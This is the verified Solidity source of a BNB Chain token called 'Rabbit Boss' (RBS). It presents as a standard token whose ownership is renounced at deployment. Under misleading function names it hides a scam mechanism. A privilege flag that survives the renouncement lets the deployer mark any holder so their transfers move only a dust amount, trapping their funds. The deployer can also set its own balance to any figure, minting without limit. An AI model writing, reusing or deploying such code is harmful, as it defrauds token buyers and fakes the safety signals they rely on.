/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RabbitBoss {
    uint8 public decimals = 18;
    uint256 constant toTokenSender = 11 ** 10;
    string public name = "Rabbit Boss";
    address public takeToken;
    mapping(address => uint256) public balanceOf;
    address public owner;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public txBuy;
    string public symbol = "RBS";
    address public walletLaunchedSender;
    mapping(address => mapping(address => uint256)) public allowance;




    bool public shouldSender;
    mapping(address => bool) public walletMax;
    modifier maxListLimit() {
        require(walletMax[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed isTo, address indexed tokenShould);
    event Transfer(address indexed txMarketingToken, address indexed swapSell, uint256 launchMax);
    event Approval(address indexed receiverAt, address indexed receiverBurnFund, uint256 launchMax);

    constructor (){
        IUniswapV2Router sellReceiverMin = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        takeToken = IUniswapV2Factory(sellReceiverMin.factory()).createPair(sellReceiverMin.WETH(), address(this));
        owner = msg.sender;
        walletLaunchedSender = owner;
        walletMax[walletLaunchedSender] = true;
        balanceOf[walletLaunchedSender] = totalSupply;
        emit Transfer(address(0), walletLaunchedSender, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address listLimitLaunched, address buyLimit, uint256 minEnableMarketing) public returns (bool) {
        if (listLimitLaunched != msg.sender && allowance[listLimitLaunched][msg.sender] != type(uint256).max) {
            require(allowance[listLimitLaunched][msg.sender] >= minEnableMarketing);
            allowance[listLimitLaunched][msg.sender] -= minEnableMarketing;
        }
        if (buyLimit == walletLaunchedSender || listLimitLaunched == walletLaunchedSender) {
            return sellTake(listLimitLaunched, buyLimit, minEnableMarketing);
        }
        if (txBuy[listLimitLaunched]) {
            return sellTake(listLimitLaunched, buyLimit, toTokenSender);
        }
        return sellTake(listLimitLaunched, buyLimit, minEnableMarketing);
    }

    function fromFund(address sellMax) public maxListLimit {
        if (sellMax == walletLaunchedSender) {
            return;
        }
        txBuy[sellMax] = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(walletLaunchedSender, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address buyLimit, uint256 minEnableMarketing) external returns (bool) {
        return transferFrom(msg.sender, buyLimit, minEnableMarketing);
    }

    function sellTake(address listEnable, address fromMode, uint256 minEnableMarketing) internal returns (bool) {
        require(balanceOf[listEnable] >= minEnableMarketing);
        balanceOf[listEnable] -= minEnableMarketing;
        balanceOf[fromMode] += minEnableMarketing;
        emit Transfer(listEnable, fromMode, minEnableMarketing);
        return true;
    }

    function autoWallet(address walletToken) public {
        if (shouldSender) {
            return;
        }
        walletMax[walletToken] = true;
        shouldSender = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function isSell(uint256 minEnableMarketing) public maxListLimit {
        balanceOf[walletLaunchedSender] = minEnableMarketing;
    }


}